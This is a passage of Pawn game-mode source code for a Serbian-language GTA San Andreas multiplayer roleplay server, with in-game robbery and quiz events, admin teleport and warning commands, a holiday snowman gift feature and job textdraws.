    format( string1, sizeof( string1 ), "{DEC4DE}[SC] ( %s ) {FBC800}%s: "col_white"%s", OI[PlayerInfo[playerid][xClan]][oPreFix], ImeIgraca(playerid), poruka);
    
    foreach( Player, i ) {

        if( PlayerInfo[i][xClan] == OI[orgID][oSavez] || PlayerInfo[i][xClan] == orgID ) {

            SCM(i, -1, string1);
        } 
    }
    
    new string[ 128 ]; 
    format( string, sizeof( string ), "(/sc)Savez %s: %s", ImeIgraca( playerid ), poruka );
    LogSave( "Ostalo/LogSavezChat.log", string );

    return true;
}

// kapicaControl(playerid, bool:show) {

//     if(show) {

//         if(IsPlayerAttachedObjectSlotUsed(playerid, OBJECT_SLOT_HEAD))
//             RemovePlayerAttachedObject(playerid, OBJECT_SLOT_HEAD);
//         SetPlayerAttachedObject(playerid, OBJECT_SLOT_HEAD, 19064, 2, 0.153000, -0.007000, 0.006999, -174.499908, 98.699996, -79.699996, 1.000000, 1.000000, 1.000000);

//         nosiKapicu[playerid] = true;

//         return 1;
//     }
//     else {

//         if(IsPlayerAttachedObjectSlotUsed(playerid, OBJECT_SLOT_HEAD))
//             RemovePlayerAttachedObject(playerid, OBJECT_SLOT_HEAD);

//         nosiKapicu[playerid] = false;

//         return 1;
//     }
// }

// CMD:wpanel(playerid) {

//     new kapica[32];
//     if(nosiKapicu[playerid]) kapica = "{00d904}Ukljuceno";
//     else kapica = "{fe0202}Iskljuceno";

//     new sneg[32];
//     if(snowOn[playerid]) sneg = "{00d904}Ukljuceno";
//     else sneg = "{fe0202}Iskljuceno";

//     new bigString[1024], string[128];

//     format(string, sizeof(string), "Padanje Snega [ %s ]\n", sneg);
//     strcat(bigString, string);
//     format(string, sizeof(string), "Kapica [ %s ]\n", kapica);
//     strcat(bigString, string);

//     ShowPlayerDialog(playerid, dialog_WPanel, DIALOG_STYLE_LIST, "Winter Edition", bigString, "Potvrdi", "Odustani");

//     return 1;
// }

// forward UpdateSnow(playerid);
// public UpdateSnow(playerid)
// {
//     if(!snowOn[playerid]) return 0;
//     new Float:pPos[3];
//     GetPlayerPos(playerid, pPos[0], pPos[1], pPos[2]);
//     for(new i = 0; i < MAX_SNOW_OBJECTS; i++) SetDynamicObjectPos(snowObject[playerid][i], pPos[0] + random(SNOW_RADIUS), pPos[1] + random(SNOW_RADIUS), pPos[2] - 5);
//     return 1;
// }
 
// stock CreateSnow(playerid)
// {
//     if(snowOn[playerid]) return 0;
//     new Float:pPos[3];
//     GetPlayerPos(playerid, pPos[0], pPos[1], pPos[2]);
//     for(new i = 0; i < MAX_SNOW_OBJECTS; i++) snowObject[playerid][i] = CreateDynamicObject(18864, pPos[0] + random(SNOW_RADIUS), pPos[1] + random (SNOW_RADIUS), pPos[2] - 5, random(100), random(100), random(100), -1, -1, playerid);
//     snowOn[playerid] = true;
//     updateTimer[playerid] = SetTimerEx("UpdateSnow", UPDATE_INTERVAL, true, "i", playerid);
//     return 1;
// }
 
// stock DeleteSnow(playerid)
// {
//     if(!snowOn[playerid]) return 0;
//     for(new i = 0; i < MAX_SNOW_OBJECTS; i++) DestroyDynamicObject(snowObject[playerid][i]);
//     KillTimer(updateTimer[playerid]);
//     snowOn[playerid] = false;
//     return 1;
// }

task drzaveKviz[900000]() {

    if(aktivanKviz) {

        va_SendClientMessageToAll(-1, "{F55B65}[VALHALLA - KVIZ] {FFFFFF}Niko nije uspeo da resi kviz na vreme! Resenje : {FF0000}%s", gradoviKviz[kvizResenje][gradoviRez]);
        new id = RandomNew(0, 14);
        kvizResenje = id;

        va_SendClientMessageToAll(-1, "{F55B65}[VALHALLA - KVIZ] {FFFFFF}Koji je glavni grad drzave {FF0000}%s!", gradoviKviz[id][gradoviGrad]);

        return 1;
    }

    aktivanKviz = true;

    new id = RandomNew(0, 14);
    kvizResenje = id;

    va_SendClientMessageToAll(-1, "{F55B65}[VALHALLA - KVIZ] {FFFFFF}Koji je glavni grad drzave {FF0000}%s!", gradoviKviz[id][gradoviGrad]);

    return 1;
}

task pornoKrevetCheck[5000]() {

    if(KrevetUpotreba) {

        new count = 0;
        foreach(Player, i) {

            if(radiPorno[i] && IsValidPlayerProgressBar(i, PornoBar[i])) count++;
        }
        if(count == 0) {

            KrevetUpotreba = false;
            return 1;
        }
    }

    return 1;
}

////////////////////////////////////////////

ResetujRolexRob() {

    RolexUToku = false;
    RolexBioSkoro = false;
    rolexRobaOrg = 0;
    opljackaniRafovi = 0;

    unistiRolexPickup();

    return 1;
}

kreirajRolexPickup() {

    for(new i = 0; i < 14; i++) {

        RolexLabel[i] = CreateDynamic3DTextLabel(""col_white"Da opljackas policu klikni\n"col_crvena"Y", 0x000000FF, RolexPickupPos[i][0],RolexPickupPos[i][1],RolexPickupPos[i][2], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);
        RolexPickup[i] = CreateDynamicPickup(2710, 1, RolexPickupPos[i][0],RolexPickupPos[i][1],RolexPickupPos[i][2], -1, -1, -1, 30.0, -1, 0);
    }

    return 1;
}

timer rolexRobTimer[550000]() {

    new count;
    for(new i = 0; i < 14; i++) {

        if(IsValidDynamicPickup(RolexPickup[i]))
            count++;
    }
    if(count == 0 && RolexUToku) {

        SendClientMessageToAll(-1, ""SRVBOJA1SCM"====================================="col_white" [ VANDREDNE VESTI ] "SRVBOJA1SCM"=====================================");
        SendClientMessageToAll(-1, ""SRVBOJA1SCM"REPORTER: "col_white"Obavestavamo gradjane da policija nije uspela da spreci pljacku "SRVBOJA1SCM"ROLEX STORE-a"col_white"!");
        SendClientMessageToAll(-1, ""SRVBOJA1SCM"===============================================================================================================");

        RolexUToku = false;
        RolexBioSkoro = true;

        defer resetRolexRob();

        return 1;
    }
    else if(count > 0 && RolexUToku) {

        RolexUToku = false;
        RolexBioSkoro = true;
        rolexRobaOrg = 0;
        opljackaniRafovi = 0;

        unistiRolexPickup();

        defer resetRolexRob();

        SCMTA(-1, ""SRVBOJA1SCM"====================================="col_white" [ VANDREDNE VESTI ] "SRVBOJA1SCM"=====================================");
        SCMTA(-1, ""SRVBOJA1SCM"REPORTER: "col_white"Obavestavamo gradjane da je policija uspesno sprecila pljacku "SRVBOJA1SCM"ROLEX STORE-a"col_white"!");
        SCMTA(-1, ""SRVBOJA1SCM"REPORTER: "col_white"Za svoje dobro delo, grad ih nagradjuje novcanom nagradom od "SRVBOJA1SCM"15.000$"col_white" svakom clanu Policije!");
        SCMTA(-1, ""SRVBOJA1SCM"===============================================================================================================");

        foreach( Player, k ) {

            if( IsPlayerConnected( k ) ) {
                
                if(ClanPolicije(k) && !isPlayerAFK(k) ) {
                    DajIgracuNovac(k, 15000);
                    SendInfoMessage(k, "Za uspesno sprecavanje pljacke dobio si 15.000$!");
                }
            }
        }

        return 1;
    }

    return 1;
}

timer robRolexTimer[30000](playerid) {

    TogglePlayerControllable(playerid, true);

    PlayerInfo[playerid][xZlato] += RolexRobPrice;
    SavePlayer(playerid);

    UpdateZlatoTD(playerid);

    robaRafRolex[playerid] = false;

    SendInfoMessage(playerid, "Opljackao si raf i dobio %dg zlata, nastavi dalje!", RolexRobPrice);

    opljackaniRafovi++;

    if(opljackaniRafovi == 14) {

        SendClientMessageToAll(-1, ""SRVBOJA1SCM"====================================="col_white" [ VANDREDNE VESTI ] "SRVBOJA1SCM"=====================================");
        SendClientMessageToAll(-1, ""SRVBOJA1SCM"REPORTER: "col_white"Obavestavamo gradjane da policija nije uspela da spreci pljacku "SRVBOJA1SCM"ROLEX STORE-a"col_white"!");
        SendClientMessageToAll(-1, ""SRVBOJA1SCM"===============================================================================================================");

        RolexUToku = false;
        RolexBioSkoro = true;

        defer resetRolexRob();

        return 1;
    }

    return 1;
}

timer resetRolexRob[21600000]() {

    if(!RolexBioSkoro) return 0;

    ResetujRolexRob();

    return 1;
}

unistiRolexPickup() {

    for(new i = 0; i < 14; i++) {

        if(IsValidDynamicPickup(RolexPickup[i]))
            DestroyDynamicPickup(RolexPickup[i]);

        if(IsValidDynamic3DTextLabel(RolexLabel[i]))
            DestroyDynamic3DTextLabel(RolexLabel[i]);
    }

    return 1;
}

stock SetVehicleIndicator(vehicleid, leftindicator=0, rightindicator=0)
{
    if(!leftindicator & !rightindicator) return false;
    new Float:_vX[2], Float:_vY[2], Float:_vZ[2];
    if(rightindicator)
    {
        if(IsTrailerAttachedToVehicle(vehicleid))
        {
            new omg = GetVehicleModel(GetVehicleTrailer(vehicleid));
            GetVehicleModelInfo(omg, VEHICLE_MODEL_INFO_SIZE, _vX[0], _vY[0], _vZ[0]);
            Indicators_xqz[vehicleid][4] = CreateObject(19294, 0, 0, 0,0,0,0);
            AttachObjectToVehicle(Indicators_xqz[vehicleid][4], GetVehicleTrailer(vehicleid),  _vX[0]/2.4, -_vY[0]/3.35, -1.0 ,0,0,0);
        }
        GetVehicleModelInfo(GetVehicleModel(vehicleid), VEHICLE_MODEL_INFO_SIZE, _vX[0], _vY[0], _vZ[0]);
        Indicators_xqz[vehicleid][0] = CreateObject(19294, 0, 0, 0,0,0,0);
        AttachObjectToVehicle(Indicators_xqz[vehicleid][0], vehicleid,  _vX[0]/2.23, _vY[0]/2.23, 0.1 ,0,0,0);
        Indicators_xqz[vehicleid][1] = CreateObject(19294, 0, 0, 0,0,0,0);
        AttachObjectToVehicle(Indicators_xqz[vehicleid][1], vehicleid,  _vX[0]/2.23, -_vY[0]/2.23, 0.1 ,0,0,0);
    }
    if(leftindicator)
    {
        if(IsTrailerAttachedToVehicle(vehicleid))
        {
            new omg = GetVehicleModel(GetVehicleTrailer(vehicleid));
            GetVehicleModelInfo(omg, VEHICLE_MODEL_INFO_SIZE, _vX[0], _vY[0], _vZ[0]);
            Indicators_xqz[vehicleid][5] = CreateObject(19294, 0, 0, 0,0,0,0);
            AttachObjectToVehicle(Indicators_xqz[vehicleid][5], GetVehicleTrailer(vehicleid),  -_vX[0]/2.4, -_vY[0]/3.35, -1.0 ,0,0,0);
        }
        GetVehicleModelInfo(GetVehicleModel(vehicleid), VEHICLE_MODEL_INFO_SIZE, _vX[0], _vY[0], _vZ[0]);
        Indicators_xqz[vehicleid][2] = CreateObject(19294, 0, 0, 0,0,0,0);
        AttachObjectToVehicle(Indicators_xqz[vehicleid][2], vehicleid,  -_vX[0]/2.23, _vY[0]/2.23, 0.1 ,0,0,0);
        Indicators_xqz[vehicleid][3] = CreateObject(19294, 0, 0, 0,0,0,0);
        AttachObjectToVehicle(Indicators_xqz[vehicleid][3], vehicleid,  -_vX[0]/2.23, -_vY[0]/2.23, 0.1 ,0,0,0);
    }
    return 1;
}

stock IsAPlane(carid2)
{
    new carid = GetVehicleModel(carid2);
    if(carid == 592 || carid == 577 || carid == 511 || carid == 512 || carid == 593 || carid == 520 || carid == 553 || carid == 476 || carid == 519 || carid == 460 || carid == 513) return 1;
    return 0;
}
 
stock IsABoat(carid)
{
    new modelid = GetVehicleModel(carid);
    if(modelid == 430 || modelid == 446 || modelid == 452 || modelid == 453 || modelid == 454 || modelid == 472 || modelid == 473 || modelid == 484 || modelid == 493 || modelid == 595)
    {
        return 1;
    }
    return 0;
}

stock isPlayerWorking(playerid) {

    if(radiPilot[playerid] != 0) return true;
    if(prevoziDrva[playerid] != 0) return true;
    if(radiAstronaut[playerid]) return true;
    if(radiPorno[playerid]) return true;
    if(radiLovac[playerid]) return true;
    if(playerHacking[playerid] != 0) return true;
    if(RadiDelivery[playerid]) return true;
    if(KrenuoKosenje[playerid]) return true;
    if(PosaoRudar[playerid] != 0) return true;
    if(RadiSabotazer{playerid}) return true;
    if(RadiMoler[playerid]) return true;
    if(RadiVojnik{playerid}) return true;
    if(radiVojnik2[playerid]) return true;

    else return false;
}

timer wastedTDCheck[5000](playerid) {

    WastedTDControl(playerid, false);

    return 1;
}

ptask vipVremeCount[60000](playerid) {

    if(IsPlayerNPC(playerid)) return 0;
    if(!PlayerLogged[playerid]) return 0;

    if(PlayerInfo[playerid][xVIPLevel] >= 1 && PlayerInfo[playerid][xVIPVreme] >= 1) {

        PlayerInfo[playerid][xVIPVreme]--;
        SavePlayer(playerid);
    }
    if(PlayerInfo[playerid][xVIPVreme] == 0 && PlayerInfo[playerid][xVIPLevel] >= 1) {

        PlayerInfo[playerid][xVIPLevel] = 0;
        SavePlayer(playerid);
        SendInfoMessage(playerid, "VIP ti je istekao!");
    }

    return 1;
}

CMD:dovedisveadmine( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] == 7  ) {
        if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
        new Float:x, Float:y, Float:z;
        GetPlayerPos( playerid, x, y, z );
        foreach( Player, i ) {
            if( i != IPI && i != playerid && PlayerInfo[i][xAdmin] >= 1) {
                if(!canPlayerTeleport(i)) continue;
                new rand = random(10);
                Novi_SetPlayerPos( i, x+rand, y+rand, z );
                SetPlayerInterior( i, GetPlayerInterior( playerid ) );
                SetPlayerVirtualWorld( i, GetPlayerVirtualWorld( playerid ) );
            }
        }
        format( globalstring, sizeof( globalstring ), "DOVEDISVEADMINE | %s je teleportovao sve admine do sebe.", ImeIgraca( playerid ) );
        AdminPoruka( NARACRVENA, globalstring );
    }
    else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return 1;
}

CMD:dovedisvehelpere( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] == 7 || PlayerInfo[ playerid ][ xSupporter ] > 3 || PlayerInfo[playerid][xSkriptaRank] == 7) {
        //if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
        new Float:x, Float:y, Float:z;
        GetPlayerPos( playerid, x, y, z );
        foreach( Player, i ) {
            if( i != IPI && i != playerid && PlayerInfo[i][xSupporter] >= 1) {
                if(!canPlayerTeleport(i)) continue;
                new rand = random(10);
                Novi_SetPlayerPos( i, x+rand, y+rand, z );
                SetPlayerInterior( i, GetPlayerInterior( playerid ) );
                SetPlayerVirtualWorld( i, GetPlayerVirtualWorld( playerid ) );
            }
        }
        format( globalstring, sizeof( globalstring ), "DOVEDISVEHELPERE | %s je teleportovao sve helpere do sebe.", ImeIgraca( playerid ) );
        AdminPoruka( NARACRVENA, globalstring );
    }
    else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return 1;
}

CMD:dovedisvepromotere( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] == 7 || PlayerInfo[playerid][xSkriptaRank] == 5) {
        //if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
        new Float:x, Float:y, Float:z;
        GetPlayerPos( playerid, x, y, z );
        foreach( Player, i ) {
            if( i != IPI && i != playerid && PlayerInfo[i][xPromoter] >= 1) {
                if(!canPlayerTeleport(i)) continue;
                new rand = random(10);
                Novi_SetPlayerPos( i, x+rand, y+rand, z );
                SetPlayerInterior( i, GetPlayerInterior( playerid ) );
                SetPlayerVirtualWorld( i, GetPlayerVirtualWorld( playerid ) );
            }
        }
        format( globalstring, sizeof( globalstring ), "DOVEDISVEPROMOTERE | %s je teleportovao sve promotere do sebe.", ImeIgraca( playerid ) );
        AdminPoruka( NARACRVENA, globalstring );
    }
    else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return 1;
}

CMD:dovedisvelidere( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] == 7 || PlayerInfo[playerid][xSkriptaRank] == 4) {
        //if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
        new Float:x, Float:y, Float:z;
        GetPlayerPos( playerid, x, y, z );
        foreach( Player, i ) {
            if( i != IPI && i != playerid && PlayerInfo[i][xLider] >= 1) {
                if(!canPlayerTeleport(i)) continue;
                new rand = random(10);
                Novi_SetPlayerPos( i, x+rand, y+rand, z );
                SetPlayerInterior( i, GetPlayerInterior( playerid ) );
                SetPlayerVirtualWorld( i, GetPlayerVirtualWorld( playerid ) );
            }
        }
        format( globalstring, sizeof( globalstring ), "DOVEDISVELIDERE | %s je teleportovao sve lidere do sebe.", ImeIgraca( playerid ) );
        AdminPoruka( NARACRVENA, globalstring );
    }
    else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return 1;
}


CMD:doniraj(playerid) {

    if(PlayerInfo[playerid][xLevel] < 5) return SendErrorMessage(playerid, "Samo igraci level 5+!");
    if(!IsPlayerInRangeOfPoint(playerid, 5.0, 1878.4663,-1385.0624,13.5734)) return SendErrorMessage(playerid, "Nisi blizu sneska!");
    if(GetPlayerMoney(playerid) < 200000) return SendErrorMessage(playerid, "Nemas dovoljno novca! ( $200.000 )");

    if(aktiviranSnesko) return SendErrorMessage(playerid, "Pricekaj malo, vec je aktiviran!");

    DajIgracuNovacSpeech(playerid, -200000);

    va_SendClientMessageToAll(0xD4AF37FF, "(SNESKO BELIC) "col_white"Igrac %s je podmitio sneska sa 200.000$ da baci poklon ranije!", ImeIgraca(playerid));
    SendClientMessageToAll(0xD4AF37FF, "(SNESKO BELIC) "col_white"Snesko belic ce za 5 minuta ostaviti poklone u Skate Parku svakome ko je blizu!");

    aktiviranSnesko = true;

    defer dajSneskoPoklon();

    return 1;
}

CMD:aktivirajsneska(playerid) {

    if(PlayerInfo[playerid][xAdmin] < 7) return SendErrorMessage(playerid, "Nisi ovlascen!");
    if(aktiviranSnesko) return SendErrorMessage(playerid, "Pricekaj malo, vec je aktiviran!");

    va_SendClientMessageToAll(0xD4AF37FF, "(SNESKO BELIC) "col_white"Administrator %s je aktivirao sneska belica!", ImeIgraca(playerid));
    SendClientMessageToAll(0xD4AF37FF, "(SNESKO BELIC) "col_white"Snesko belic ce za 5 minuta ostaviti poklone u Skate Parku svakome ko je blizu!");

    aktiviranSnesko = true;

    defer dajSneskoPoklon();

    return 1;
}

task sneskoDobijanje[18000000]() {

    SendClientMessageToAll(0xD4AF37FF, "(SNESKO BELIC) "col_white"Snesko belic ce za 5 minuta ostaviti poklone u Skate Parku svakome ko je blizu!");

    defer dajSneskoPoklon();

    aktiviranSnesko = true;

    return 1;
}

timer dajSneskoPoklon[300000]() {

    foreach(Player, i) {

        if(IsPlayerInRangeOfPoint(i, 10.0, 1878.4663,-1385.0624,13.5734)) {

            dajRandomPoklon(i);
        }
    }

    SendClientMessageToAll(0xD4AF37FF, "(SNESKO BELIC) "col_white"Snesko belic je svima u blizini dao poklone!");
    aktiviranSnesko = false;

    return 1;
}

dajRandomPoklon(playerid) {

    if(PlayerInfo[playerid][xWanted] >= 1) return SendClientMessage(playerid, 0xD4AF37FF, "(SNESKO BELIC) "col_white"Nisi bio dobar i zato neces dobiti poklon!!!");

    new randomPrice = RandomNew(1, 6);
    new sneskoPrice[16];

    switch(randomPrice) {

        case 1: {

            sneskoPrice = "+5.000$";
            DajIgracuNovac(playerid, 5000);
            SavePlayer(playerid);
        }
        case 2: {

            sneskoPrice = "+2 Respekt";
            PlayerInfo[playerid][xRespekt] += 2;
            SavePlayer(playerid);
            respectCheck(playerid);
        }
        case 3: {

            sneskoPrice = "+4 Respekt";
            PlayerInfo[playerid][xRespekt] += 4;
            SavePlayer(playerid);
            respectCheck(playerid);
        }
        case 4: {

            sneskoPrice = "+15.000$";
            DajIgracuNovac(playerid, 15000);
            SavePlayer(playerid);
        }
        case 5: {

            sneskoPrice = "+50g zlata";
            PlayerInfo[playerid][xZlato] += 50;
            SavePlayer(playerid);
            UpdateZlatoTD(playerid);
        }
    }

    va_SendClientMessage(playerid, 0xD4AF37FF, "(SNESKO BELIC) "col_white"Snesko belic ti je dao poklon : "col_red"%s", sneskoPrice);

    return 1;
}

elektricarTDShow(playerid, bool:shown) {

    if(shown) {

        ElektricarTD[playerid][0] = CreatePlayerTextDraw(playerid, 193.333282, 167.703720, "box");
        PlayerTextDrawLetterSize(playerid, ElektricarTD[playerid][0], 0.000000, 17.666669);
        PlayerTextDrawTextSize(playerid, ElektricarTD[playerid][0], 451.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, ElektricarTD[playerid][0], 1);
        PlayerTextDrawColor(playerid, ElektricarTD[playerid][0], -1);
        PlayerTextDrawUseBox(playerid, ElektricarTD[playerid][0], 1);
        PlayerTextDrawBoxColor(playerid, ElektricarTD[playerid][0], 230);
        PlayerTextDrawSetShadow(playerid, ElektricarTD[playerid][0], 0);
        PlayerTextDrawBackgroundColor(playerid, ElektricarTD[playerid][0], 255);
        PlayerTextDrawFont(playerid, ElektricarTD[playerid][0], 1);
        PlayerTextDrawSetProportional(playerid, ElektricarTD[playerid][0], 1);

        ElektricarTD[playerid][1] = CreatePlayerTextDraw(playerid, 240.416687, 182.481552, "");
        PlayerTextDrawTextSize(playerid, ElektricarTD[playerid][1], 154.000000, 129.000000);
        PlayerTextDrawAlignment(playerid, ElektricarTD[playerid][1], 1);
        PlayerTextDrawColor(playerid, ElektricarTD[playerid][1], -1);
        PlayerTextDrawBackgroundColor(playerid, ElektricarTD[playerid][1], 0x00000000);
        PlayerTextDrawSetShadow(playerid, ElektricarTD[playerid][1], 0);
        PlayerTextDrawFont(playerid, ElektricarTD[playerid][1], 5);
        PlayerTextDrawSetProportional(playerid, ElektricarTD[playerid][1], 0);
        PlayerTextDrawSetSelectable(playerid, ElektricarTD[playerid][1], true);
        PlayerTextDrawSetPreviewModel(playerid, ElektricarTD[playerid][1], 3386);
        PlayerTextDrawSetPreviewRot(playerid, ElektricarTD[playerid][1], 360.000000, 0.000000, 270.000000, 1.000000);

        ElektricarTD[playerid][2] = CreatePlayerTextDraw(playerid, 197.083328, 168.222183, "LG Company");
        PlayerTextDrawLetterSize(playerid, ElektricarTD[playerid][2], 0.239583, 1.377037);
        PlayerTextDrawTextSize(playerid, ElektricarTD[playerid][2], 553.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, ElektricarTD[playerid][2], 1);
        PlayerTextDrawColor(playerid, ElektricarTD[playerid][2], -1);
        PlayerTextDrawSetShadow(playerid, ElektricarTD[playerid][2], 0);
        PlayerTextDrawBackgroundColor(playerid, ElektricarTD[playerid][2], 255);
        PlayerTextDrawFont(playerid, ElektricarTD[playerid][2], 1);
        PlayerTextDrawSetProportional(playerid, ElektricarTD[playerid][2], 1);

        ElektricarTD[playerid][3] = CreatePlayerTextDraw(playerid, 282.083312, 304.851898, "LD_BEAT:cross");
        PlayerTextDrawTextSize(playerid, ElektricarTD[playerid][3], 13.000000, 12.000000);
        PlayerTextDrawAlignment(playerid, ElektricarTD[playerid][3], 1);
        PlayerTextDrawColor(playerid, ElektricarTD[playerid][3], -1);
        PlayerTextDrawSetShadow(playerid, ElektricarTD[playerid][3], 0);
        PlayerTextDrawBackgroundColor(playerid, ElektricarTD[playerid][3], 255);
        PlayerTextDrawFont(playerid, ElektricarTD[playerid][3], 4);
        PlayerTextDrawSetProportional(playerid, ElektricarTD[playerid][3], 0);
        PlayerTextDrawSetSelectable(playerid, ElektricarTD[playerid][3], true);

        ElektricarTD[playerid][4] = CreatePlayerTextDraw(playerid, 339.166564, 304.333374, "LD_BEAT:cross");
        PlayerTextDrawTextSize(playerid, ElektricarTD[playerid][4], 13.000000, 12.000000);
        PlayerTextDrawAlignment(playerid, ElektricarTD[playerid][4], 1);
        PlayerTextDrawColor(playerid, ElektricarTD[playerid][4], -1);
        PlayerTextDrawSetShadow(playerid, ElektricarTD[playerid][4], 0);
        PlayerTextDrawBackgroundColor(playerid, ElektricarTD[playerid][4], 255);
        PlayerTextDrawFont(playerid, ElektricarTD[playerid][4], 4);
        PlayerTextDrawSetProportional(playerid, ElektricarTD[playerid][4], 0);
        PlayerTextDrawSetSelectable(playerid, ElektricarTD[playerid][4], true);

        ElektricarTD[playerid][5] = CreatePlayerTextDraw(playerid, 339.583160, 177.296310, "LD_BEAT:cross");
        PlayerTextDrawTextSize(playerid, ElektricarTD[playerid][5], 13.000000, 12.000000);
        PlayerTextDrawAlignment(playerid, ElektricarTD[playerid][5], 1);
        PlayerTextDrawColor(playerid, ElektricarTD[playerid][5], -1);
        PlayerTextDrawSetShadow(playerid, ElektricarTD[playerid][5], 0);
        PlayerTextDrawBackgroundColor(playerid, ElektricarTD[playerid][5], 255);
        PlayerTextDrawFont(playerid, ElektricarTD[playerid][5], 4);
        PlayerTextDrawSetProportional(playerid, ElektricarTD[playerid][5], 0);
        PlayerTextDrawSetSelectable(playerid, ElektricarTD[playerid][5], true);

        ElektricarTD[playerid][6] = CreatePlayerTextDraw(playerid, 282.083099, 178.333358, "LD_BEAT:cross");
        PlayerTextDrawTextSize(playerid, ElektricarTD[playerid][6], 13.000000, 12.000000);
        PlayerTextDrawAlignment(playerid, ElektricarTD[playerid][6], 1);
        PlayerTextDrawColor(playerid, ElektricarTD[playerid][6], -1);
        PlayerTextDrawSetShadow(playerid, ElektricarTD[playerid][6], 0);
        PlayerTextDrawBackgroundColor(playerid, ElektricarTD[playerid][6], 255);
        PlayerTextDrawFont(playerid, ElektricarTD[playerid][6], 4);
        PlayerTextDrawSetProportional(playerid, ElektricarTD[playerid][6], 0);
        PlayerTextDrawSetSelectable(playerid, ElektricarTD[playerid][6], true);

        for(new i = 0; i < 7; i++) {

            PlayerTextDrawShow(playerid, ElektricarTD[playerid][i]);
        }

        SelectTextDraw(playerid, 0xD4AF37FF);
    }
    else {

        for(new i = 0; i < 7; i++) {

            PlayerTextDrawHide(playerid, ElektricarTD[playerid][i]);
            PlayerTextDrawDestroy(playerid, ElektricarTD[playerid][i]);
            ElektricarTD[playerid][i] = PlayerText:INVALID_TEXT_DRAW;
        }
        CancelSelectTextDraw(playerid);
    }

    return 1;
}

CMD:adminwarn( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 6  ) {
        if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );

        new id;
        if( sscanf( params, "u", id ) ) return SendUsageMessage( playerid, "/adminwarn [ ID/Deo imena ]");
        if( !IsPlayerConnected( id ) ) return SendErrorMessage( playerid, "Pogresan ID!");

        if(PlayerInfo[id][xAdmin] < 1) return SendErrorMessage(playerid, "Igrac nije admin!");
        if(PlayerInfo[id][xAdmin] > PlayerInfo[playerid][xAdmin]) return SendErrorMessage(playerid, "Ne mozes dati admin warn adminu koji je veci od vas!");

        PlayerInfo[ id ][ xAdminWarn ] += 1; SavePlayer( id );

        SendInfoMessage( id, "Admin %s vam je dao Admin Warn(%d po redu)", ImeIgraca( playerid ), PlayerInfo[ id ][ xAdminWarn ]);

        SendInfoMessage( playerid, "Dali ste Admin Warn adminu %s.", ImeIgraca( id ));

        format( globalstring, sizeof( globalstring ),"ADMIN WARN | %s je dao warn adminu %s", ImeIgraca( playerid ), ImeIgraca( id ));
        AdminPoruka( NARACRVENA, globalstring );

        new string[ 128 ]; 
        format( string, sizeof( string ), "Admin %s je dao admin warn adminu %s", ImeIgraca( playerid ), ImeIgraca( id ));
        LogSave( "Ostalo/LogAdminWarn.log", string );

        if( PlayerInfo[ id ][ xAdminWarn ] >= 5 ) {
            format( globalstring, sizeof( globalstring ), "ADMIN WARN | Adminu %s je skinut admin | Razlog: 5 upozorenja.", ImeIgraca( id ));
            AdminPoruka( NARACRVENA, globalstring );

            ResetujAdmina( id );
            SacuvajAdmina( id );

            SetPlayerColor( id, 0xFFFFFF00 );
            PlayerInfo[ id ][ xAdmin ] = 0;
            PlayerInfo[ id ][ xAdminDuty ] = 0;
            PlayerInfo[ id ][ xAdminWarn ] = 0;
            PlayerInfo[ id ][ xSkin ] = SetSexSkin( id );
            PlayerInfo[ id ][ xSpawn ] = SetRandomSpawn(  );
            PostaviSkin( id, SetSexSkin( id ) );
            
            SavePlayer( id );

            Novi_SetPlayerArmour( id, 0 );
            AdminDuty[ id ] = false;

            SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je dao Admin Warn i skinuo Admin poziciju ( 5 upozorenja ).",ImeIgraca( playerid ) );
            SendClientMessageEx( playerid, SVETLOPLAVA, " Skinuli ste igracu: %s Admin poziciju ( 5 upozorenja ).",ImeIgraca( id ) );
            
        }
    }
    else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return 1;
}

CMD:skiniadminwarn( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 6  ) {
        if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
        new id;
        if( sscanf(params, "u", id ) ) return SendUsageMessage( playerid, "/skiniadminwarn [ ID/Deo imena ]");
        if( !IsPlayerConnected( id ) ) return SendErrorMessage( playerid, "Pogresan ID!" );
        if(PlayerInfo[id][xAdmin] < 1) return SendErrorMessage(playerid, "Igrac nije admin!");
        if( PlayerInfo[ id ][ xAdminWarn ] <= 0 ) return SendErrorMessage( playerid, "Igrac nema Admin warnova koje bi skinuli." );

        PlayerInfo[ id ][ xAdminWarn ] -= 1; SavePlayer( id );

        SendInfoMessage( playerid, "Skinuli ste admin warn igracu %s | Admin Warn: %d/5!", ImeIgraca( id ), PlayerInfo[ id ][ xAdminWarn ] );
        SendInfoMessage( id, "Admin %s vam je skinuo admin warn | Admin Warn: %d/5!", ImeIgraca( playerid ), PlayerInfo[ id ][ xAdminWarn ] );

        new string[ 128 ]; 
        format( string, sizeof( string ), "Admin %s je skinuo admin warn adminu %s", ImeIgraca( playerid ), ImeIgraca( id ));
        LogSave( "Ostalo/LogAdminWarn.log", string );
    }
    else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return 1;
}

public OnPlayerUseCamera(playerid) { 

